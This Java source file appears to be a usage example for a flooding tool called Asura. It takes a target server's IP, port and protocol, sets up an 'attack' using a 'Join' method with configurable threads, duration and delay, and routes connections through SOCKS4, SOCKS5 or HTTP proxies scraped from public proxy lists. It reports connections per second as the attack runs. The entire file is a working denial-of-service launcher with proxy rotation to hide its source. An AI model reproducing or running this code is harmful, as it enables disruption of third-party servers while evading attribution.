package test;

import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.methods.impl.Join;
import dev.lastknell.core.proxy.Proxy;
import dev.lastknell.core.proxy.ProxyManager;
import dev.lastknell.core.proxy.util.ProxyScraper;
import dev.lastknell.core.proxy.util.ProxyType;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Scanner;

public class AsuraExample {

    // how asura work
    /*
     * for each attack u make a new object of NettyBootstrap
     * then u make a proxy manager with a list of proxies to use in attack(Arraylist of dev.lastknell.Proxy)
     * proxy scraper helps u to scrape proxies and get ArrayList of dev.lastknell.Proxy from a ArrayList of urls(String)
     * use nettybootstrap start() method to start attack
     * and stop() method to stop attack
     */

    // args: {ip, port, protocol, duration, delay, perDelay, loopThreads, workerThreads, [s4/s5/http], usingEpool, removeFailedProxy}
    public static void main(String[] args) {
        if (args.length != 11) {
            CLI();
        }
        String ip = args[0];
        int port = Integer.parseInt(args[1]);
        int protocol = Integer.parseInt(args[2]);
        IMethod method = new Join();
        int duration = Integer.parseInt(args[3]);
        int delay = Integer.parseInt(args[4]);
        int perDelay = Integer.parseInt(args[5]);
        int loopThreads = Integer.parseInt(args[6]);
        int workerThreads = Integer.parseInt(args[7]);
        ProxyType proxyType = null;
        ProxyManager proxyManager = null;
        switch (args[8].toLowerCase()) {
            case "s4" -> {
                proxyManager = S4ProxyManager();
                proxyType = ProxyType.SOCKS4;
            }
            case "s5" -> {
                proxyManager = S5ProxyManager();
                proxyType = ProxyType.SOCKS5;
            }
            case "http" -> {
                proxyManager = HTTPProxyManager();
                proxyType = ProxyType.HTTP;
            }
        }
        boolean usingEpoll = Boolean.parseBoolean(args[9]);
        boolean remove = Boolean.parseBoolean(args[10]);

        NettyBootstrap bootstrap = new NettyBootstrap.Builder(method, ip, port, protocol, duration, proxyType, proxyManager)
                .usingEpoll(usingEpoll)
                .removeFailedProxy(remove)
                .connectLoopThreads(loopThreads)
                .workerThreads(workerThreads)
                .delay(delay)
                .perDelay(perDelay)
                .build();

        while (!bootstrap.shouldStop) {
            System.out.println("Average CPS " + bootstrap.averageCPS + " TriedCPS " + bootstrap.triedCPS + " successfulCPS " + bootstrap.successfulCPS);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    private static void CLI() {
        IMethod method = new Join();
        Scanner s = new Scanner(System.in);
        System.out.println("enter server ip:port :");
        String server = s.next();
        s.nextLine();
        System.out.println("enter server protocol:");
        int protocol = s.nextInt();
        s.nextLine();
        System.out.println("enter attack Time:");
        int time = s.nextInt();
        s.nextLine();
        System.out.println("enter loopThreads:");
        int loopThreads = s.nextInt();
        s.nextLine();
        System.out.println("enter workerThreads:");
        int workerThreads = s.nextInt();
        s.nextLine();
        System.out.println("delay:");
        int delay = s.nextInt();
        s.nextLine();
        System.out.println("per delay:");
        int perdelay = s.nextInt();
        s.nextLine();
        System.out.println("proxy type[s4/s5/http]:");
        String pt = s.next();
        s.nextLine();
        System.out.println("do u want to use epoll:");
        boolean usingEpoll = s.nextBoolean();
        s.nextLine();
        System.out.println("do u want to remove failed proxies:");
        boolean remove = s.nextBoolean();
        s.nextLine();
        ProxyType proxyType = null;
        ProxyManager proxyManager = null;
        switch (pt.toLowerCase()) {
            case "s4" -> {
                proxyManager = S4ProxyManager();
                proxyType = ProxyType.SOCKS4;
            }
            case "s5" -> {
                proxyManager = S5ProxyManager();
                proxyType = ProxyType.SOCKS5;
            }
            case "http" -> {
                proxyManager = HTTPProxyManager();
                proxyType = ProxyType.HTTP;
            }
        }
        s.close();
        NettyBootstrap bootstrap = new NettyBootstrap.Builder(method, server.split(":")[0], Integer.parseInt(server.split(":")[1]), protocol, time, proxyType, proxyManager)
                .usingEpoll(usingEpoll)
                .delay(delay)
                .perDelay(perdelay)
                .connectLoopThreads(loopThreads)
                .workerThreads(workerThreads)
                .removeFailedProxy(remove)
                .build();
        bootstrap.start();
        while (!bootstrap.shouldStop) {
            System.out.println("Average CPS " + bootstrap.averageCPS + " TriedCPS " + bootstrap.triedCPS + " successfulCPS " + bootstrap.successfulCPS);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static ProxyManager S4ProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt");
        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt");
        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt");

        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        return new ProxyManager(proxies);
    }

    public static ProxyManager S5ProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt");
        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt");
        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt");

        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        return new ProxyManager(proxies);
    }

    public static ProxyManager HTTPProxyManager() {
        ArrayList<String> urls = new ArrayList<>();
        //now add all urls u want to scrape proxyes from in this list
        urls.add("https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt");
        urls.add("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt");
        urls.add("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt");
        urls.add("https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt");
        urls.add("https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt");
        ArrayList<Proxy> proxies = new ArrayList<>();
        try {
            ProxyScraper scraper = new ProxyScraper(urls);
            // scrape proxies from links
            scraper.scrape();
            // get proxies
            proxies = new ArrayList<>(scraper.getProxies());
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        // make proxy manager
        return new ProxyManager(proxies);
    }
}